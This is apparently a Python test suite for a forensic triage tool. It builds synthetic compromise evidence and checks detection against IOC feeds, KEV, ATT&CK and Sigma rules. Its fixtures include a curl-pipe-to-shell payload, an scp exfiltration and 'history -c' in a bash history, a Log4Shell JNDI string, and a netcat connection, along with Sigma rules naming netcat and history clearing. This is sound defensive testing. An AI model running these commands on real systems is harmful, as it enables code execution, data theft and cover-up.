"""
triagekit test suite - builds synthetic evidence in a temporary folder and checks the results.

Run from the repository root:   python3 -m unittest discover -s tests -v
"""
import hashlib, json, os, shutil, subprocess, sys, tempfile, unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOL = os.path.join(ROOT, "triagekit.py")
try:
    import yaml  # noqa: F401
    HAVE_YAML = True
except ImportError:
    HAVE_YAML = False


def w(base, rel, data):
    p = os.path.join(base, rel.lstrip("/"))
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "wb") as f:
        f.write(data if isinstance(data, bytes) else data.encode())
    return p

def sha(data):
    return hashlib.sha256(data).hexdigest()

def tree_digest(base):
    h = hashlib.sha256()
    for dp, dns, fns in sorted(os.walk(base)):
        dns.sort()
        for fn in sorted(fns):
            p = os.path.join(dp, fn)
            h.update(p.encode()); h.update(open(p, "rb").read())
            h.update(str(os.stat(p).st_mtime_ns).encode())
    return h.hexdigest()

def run(*args, ok=True):
    r = subprocess.run([sys.executable, TOOL] + list(args), capture_output=True, text=True)
    if ok and r.returncode != 0:
        raise AssertionError("triagekit %s failed:\n%s\n%s" % (" ".join(args), r.stdout, r.stderr))
    return r


EVIL = b"\x7fELF-not-really-a-program-test-sample"
KNOWN = b"#!/bin/sh\necho known vendor helper\n"

SIGMA_HISTORY = """
title: Test History Tampering
id: 00000000-0000-0000-0000-000000000001
logsource: {product: linux}
detection:
  keywords: ['history -c', 'unset HISTFILE']
  condition: keywords
level: high
tags: [attack.t1070.003]
"""
SIGMA_CVE = """
title: Test JNDI Lookup In Log
id: 00000000-0000-0000-0000-000000000002
logsource: {product: linux}
detection:
  keywords: ['jndi:ldap']
  condition: keywords
level: medium
tags: [cve.2021-44228]
"""
SIGMA_AUDITD = """
title: Test Netcat Execution In Auditd
id: 00000000-0000-0000-0000-000000000003
logsource: {product: linux, service: auditd}
detection:
  sel: {type: EXECVE, a0|endswith: ['nc', 'ncat']}
  filter: {a1: '-h'}
  condition: sel and not filter
level: low
"""
SIGMA_CATEGORY = """
title: Needs Telemetry
id: 00000000-0000-0000-0000-000000000004
logsource: {product: linux, category: process_creation}
detection:
  sel: {Image|endswith: '/nc'}
  condition: sel
level: high
"""
SIGMA_AGG = """
title: Aggregation Rule
id: 00000000-0000-0000-0000-000000000005
logsource: {product: linux}
detection:
  sel: ['x']
  condition: sel | count() > 5
level: high
"""


class TriageKitTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.mkdtemp(prefix="triagekit_test_")
        ev = cls.ev = os.path.join(cls.tmp, "evidence")
        w(ev, "/tmp/.x/payload.sh", "#!/bin/bash\ncurl -s http://198.51.100.7/a | sh\n")
        w(ev, "/tmp/evil.bin", EVIL)
        w(ev, "/tmp/vendor_helper.sh", KNOWN)
        w(ev, "/home/bob/.bash_history",
          "ls -la\nscp /tmp/data.tar.gz bob@203.0.113.9:/srv/drop/\nwget http://198.51.100.7/x\nhistory -c\n")
        auth = "".join("Mar  1 10:0%d:00 srv sshd[11%d]: Failed password for bob from 203.0.113.50 port 5%d ssh2\n"
                       % (i, i, i) for i in range(6))
        auth += "Mar  1 10:07:00 srv sshd[1200]: Accepted password for bob from 203.0.113.50 port 5999 ssh2\n"
        auth += "Mar  1 10:09:00 srv sudo:      bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash\n"
        auth += "Mar  1 11:00:00 srv sshd[1300]: Accepted publickey for ops from 10.0.0.53 port 4000 ssh2\n"
        w(ev, "/var/log/auth.log", auth)
        w(ev, "/var/log/syslog", "Mar  1 10:20:00 srv app[9]: request header ${jndi:ldap://203.0.113.9/a}\n")
        w(ev, "/var/log/audit/audit.log",
          'type=EXECVE msg=audit(1709287200.000:42): argc=4 a0="/usr/bin/nc" a1="203.0.113.9" a2="4444"\n'
          'type=EXECVE msg=audit(1709287300.000:43): argc=2 a0="nc" a1="-h"\n')
        w(ev, "/opt/app/notes.txt", "patch for CVE-2021-44228 still pending\n")
        w(ev, "/usr/share/doc/libfoo/changelog.Debian", "fixes CVE-2021-44228\n")

        fd = cls.fd = os.path.join(cls.tmp, "feeds")
        w(fd, "kev.json", json.dumps({"catalogVersion": "2026.10.01", "dateReleased": "2026-10-01",
                                      "vulnerabilities": [{"cveID": "CVE-2021-44228", "vendorProject": "Apache",
                                                           "product": "Log4j2", "vulnerabilityName": "Log4j2 RCE",
                                                           "dateAdded": "2021-12-10"}]}))
        w(fd, "ioc.csv", '# test feed\n"first_seen","sha256_hash","ip"\n"2026-10-01","%s","198.51.100.7"\n' % sha(EVIL))
        w(fd, "known.txt", "%s  vendor_helper.sh\n" % sha(KNOWN))
        w(fd, "attack.json", json.dumps({"objects": [
            {"type": "x-mitre-collection", "x_mitre_version": "test-1"},
            {"type": "attack-pattern", "id": "ap--1", "name": "Clear Command History",
             "external_references": [{"source_name": "mitre-attack", "external_id": "T1070.003"}],
             "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "defense-evasion"}]},
            {"type": "attack-pattern", "id": "ap--old", "name": "Old Technique", "revoked": True,
             "external_references": [{"source_name": "mitre-attack", "external_id": "T1048"}]},
            {"type": "attack-pattern", "id": "ap--new", "name": "New Exfil Technique",
             "external_references": [{"source_name": "mitre-attack", "external_id": "T9999.001"}]},
            {"type": "relationship", "relationship_type": "revoked-by", "source_ref": "ap--old",
             "target_ref": "ap--new"}]}))
        sg = cls.sg = os.path.join(cls.tmp, "sigma")
        for i, body in enumerate([SIGMA_HISTORY, SIGMA_CVE, SIGMA_AUDITD, SIGMA_CATEGORY, SIGMA_AGG]):
            w(sg, "rule%d.yml" % i, body)

        cls.cfg = w(cls.tmp, "triage.toml", """
[case]
name = "Unit test case"
examiner = "tester"
[sources]
local_rules = ["%s"]
kev = "feeds/kev.json"
attack = "feeds/attack.json"
known_software = ["feeds/known.txt"]
%s
[[sources.ioc]]
name = "Test feed"
org = "Test Org"
path = "feeds/ioc.csv"
snapshot_date = "2026-10-01"
types = ["sha256", "ip"]
[scan]
syslog_year = 2026
[allow]
ips = ["10.0.0.0/24"]
""" % (os.path.join(ROOT, "rules"), 'sigma = ["sigma"]' if HAVE_YAML else ""))
        cls.before = tree_digest(ev)
        cls.out = os.path.join(cls.tmp, "out1")
        cls.r = run("scan", ev, "-o", cls.out, "-c", cls.cfg)
        cls.findings = json.load(open(os.path.join(cls.out, "findings.json")))["findings"]
        with open(os.path.join(cls.out, "run.json")) as fh:
            cls.runinfo = json.load(fh)

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def get(self, rule_id, subject=None):
        return [f for f in self.findings if f["rule_id"] == rule_id and (subject is None or f["subject"] == subject)]

    # --- forensic soundness
    def test_evidence_untouched(self):
        self.assertEqual(self.before, tree_digest(self.ev))

    def test_output_inside_evidence_refused(self):
        r = run("scan", self.ev, "-o", os.path.join(self.ev, "out"), "-c", self.cfg, ok=False)
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("must not be inside the evidence", r.stderr)

    def test_deterministic(self):
        out2 = os.path.join(self.tmp, "out2")
        run("scan", self.ev, "-o", out2, "-c", self.cfg)
        b1 = open(os.path.join(self.out, "findings.json"), "rb").read()
        b2 = open(os.path.join(out2, "findings.json"), "rb").read()
        self.assertEqual(b1, b2)
        self.assertEqual(self.runinfo["result_digest"], hashlib.sha256(b1).hexdigest())

    def test_manifest_lists_every_file(self):
        rows = open(os.path.join(self.out, "manifest.csv")).read().strip().splitlines()
        self.assertEqual(len(rows) - 1, self.runinfo["stats"]["files"])

    # --- local rules
    def test_temp_script(self):
        self.assertTrue(self.get("LOCAL-FS-001", "/tmp/.x/payload.sh"))

    def test_history_clearing_high(self):
        f = self.get("LOCAL-LN-001", "/home/bob/.bash_history")
        self.assertEqual(f[0]["priority"], "high")
        self.assertEqual(f[0]["evidence"][0]["lines"][0][0], 4)          # line number recorded
        self.assertIn("bob", f[0]["entities"]["users"])

    def test_min_hits_threshold(self):
        f = self.get("LOCAL-LN-003")
        self.assertEqual(f[0]["evidence"][0]["hits"], 6)

    def test_sudo_root_shell(self):
        self.assertTrue(self.get("LOCAL-LN-005", "/var/log/auth.log"))

    def test_allowlist_suppresses_and_is_reported(self):
        f = self.get("LOCAL-LN-004")
        self.assertNotIn("10.0.0.53", f[0]["entities"]["ips"])
        self.assertEqual(self.runinfo["suppressed"].get("LOCAL-LN-004"), 1)
        self.assertIn("Suppressions and overrides", open(os.path.join(self.out, "report.md")).read())

    # --- published sources
    def test_revoked_attack_technique_mapped(self):
        t = [x for x in self.get("LOCAL-LN-002")[0]["attack"] if x["id"] == "T1048"][0]
        self.assertEqual(t["name"], "New Exfil Technique")
        self.assertIn("replaced by T9999.001", t["note"])

    def test_ioc_hash_match(self):
        f = self.get("IOC:Test feed", "/tmp/evil.bin")
        self.assertEqual(f[0]["priority"], "high")
        self.assertEqual(f[0]["source"]["org"], "Test Org")

    def test_ioc_ip_match(self):
        f = [x for x in self.get("IOC:Test feed", "/tmp/.x/payload.sh")]
        self.assertIn("198.51.100.7", f[0]["evidence"][0]["indicators"])

    def test_known_software_lowers_one_step(self):
        f = self.get("LOCAL-FS-001", "/tmp/vendor_helper.sh")[0]
        self.assertEqual((f["base_priority"], f["priority"]), ("medium", "low"))
        self.assertTrue(any("known-software" in a for a in f["adjustments"]))

    def test_kev_mention_and_exclusion(self):
        self.assertTrue(self.get("KEV:CVE-2021-44228", "/opt/app/notes.txt"))
        self.assertFalse(self.get("KEV:CVE-2021-44228", "/usr/share/doc/libfoo/changelog.Debian"))

    @unittest.skipUnless(HAVE_YAML, "PyYAML not installed")
    def test_sigma_keyword_rule_and_attack_label(self):
        f = self.get("SIGMA:00000000-0000-0000-0000-000000000001", "/home/bob/.bash_history")[0]
        self.assertEqual(f["priority"], "high")
        self.assertEqual(f["attack"][0]["name"], "Clear Command History")

    @unittest.skipUnless(HAVE_YAML, "PyYAML not installed")
    def test_sigma_cve_tag_raised_by_kev(self):
        f = self.get("SIGMA:00000000-0000-0000-0000-000000000002", "/var/log/syslog")[0]
        self.assertEqual((f["base_priority"], f["priority"]), ("medium", "high"))

    @unittest.skipUnless(HAVE_YAML, "PyYAML not installed")
    def test_sigma_auditd_fields_and_not(self):
        f = self.get("SIGMA:00000000-0000-0000-0000-000000000003")[0]
        self.assertEqual(f["evidence"][0]["hits"], 1)                    # the `nc -h` line is filtered out

    @unittest.skipUnless(HAVE_YAML, "PyYAML not installed")
    def test_sigma_unsupported_rules_skipped_with_reason(self):
        reasons = open(os.path.join(self.out, "sigma_skipped.csv")).read()
        self.assertIn("needs live telemetry", reasons)
        self.assertIn("aggregation", reasons)

    # --- correlation
    def test_correlation_same_ip_raises_one_step(self):
        f = self.get("LOCAL-COR-001")[0]
        self.assertEqual((f["base_priority"], f["priority"]), ("low", "medium"))
        self.assertEqual(len(f["contributors"]), 2)

    def test_correlation_narrows_evidence_to_shared_ip(self):
        f = self.get("LOCAL-COR-001")[0]
        self.assertEqual(f["entities"]["ips"], ["203.0.113.50"])
        self.assertNotIn("ops", f["entities"]["users"])                 # unrelated login from 10.0.0.53
        for e in f["evidence"]:
            self.assertTrue(all("203.0.113.50" in ln for _, ln in e["lines"]))

    def test_threshold_applies_per_address_before_correlating(self):
        ev = os.path.join(self.tmp, "spread")
        auth = "".join("Mar  2 09:0%d:00 srv sshd[2%d]: Failed password for root from 198.51.100.%d port 1 ssh2\n"
                       % (i, i, i + 10) for i in range(6))
        auth += "Mar  2 09:30:00 srv sshd[300]: Accepted password for root from 198.51.100.10 port 2 ssh2\n"
        w(ev, "/var/log/auth.log", auth)
        out = os.path.join(self.tmp, "out_spread")
        run("scan", ev, "-o", out)
        fs = json.load(open(os.path.join(out, "findings.json")))["findings"]
        self.assertTrue([x for x in fs if x["rule_id"] == "LOCAL-LN-003"])      # 6 failures in the file
        self.assertFalse([x for x in fs if x["rule_id"] == "LOCAL-COR-001"])    # but only 1 from that address

    def test_correlation_same_user_attack_patterns(self):
        f = self.get("LOCAL-COR-002")
        self.assertTrue(f and f[0]["subject"] == "same user bob")

    def test_correlation_same_file_needs_two_sources(self):
        f = self.get("LOCAL-COR-003")
        self.assertTrue(any(x["subject"] == "same file /tmp/evil.bin" for x in f))

    # --- outputs and review
    def test_findings_directory_by_priority(self):
        for f in self.findings:
            self.assertTrue(os.path.exists(os.path.join(self.out, "findings", f["priority"], f["id"] + ".md")))

    def test_review_recorded_and_rendered(self):
        fid = self.get("LOCAL-LN-001")[0]["id"]
        run("review", self.out, fid, "confirmed", "--note", "seen in timeline", "--examiner", "tester")
        rep = open(os.path.join(self.out, "report.md")).read()
        self.assertIn("confirmed by tester - seen in timeline", rep)
        self.assertIn("triage priorities are an order of review, not conclusions", rep.lower())

    def test_tracekit_adapter(self):
        case = os.path.join(self.tmp, "case")
        w(case, "recovered/allocated/etc/hostname", "srv\n")
        data = b"PK\x03\x04 fake zip"
        w(case, "recovered/deleted/home/bob/data.zip", data)
        w(case, "findings/tracekit_state.json", json.dumps({"ledger": [
            {"id": "E-001", "path": "/home/bob/data.zip", "inode": 1043, "sha256": sha(data), "state": "deleted"}]}))
        out = os.path.join(self.tmp, "out_tk")
        run("scan", "--tracekit", case, "-o", out)
        fs = json.load(open(os.path.join(out, "findings.json")))["findings"]
        f = [x for x in fs if x["rule_id"] == "LOCAL-FS-003"][0]
        self.assertEqual((f["state"], f["evidence"][0]["inode"]), ("deleted", 1043))

    def test_bad_rule_rejected(self):
        bad = os.path.join(self.tmp, "badrules")
        w(bad, "bad.toml", '[[rule]]\nid="X"\ntitle="t"\npriority="urgent"\ntarget="file"\nreason="r"\n[rule.match]\npath_regex="x"\n')
        cfg = w(self.tmp, "bad.toml", '[sources]\nlocal_rules = ["badrules"]\n')
        r = run("rules", "-c", cfg, ok=False)
        self.assertIn("configuration error", r.stderr)


if __name__ == "__main__":
    unittest.main()
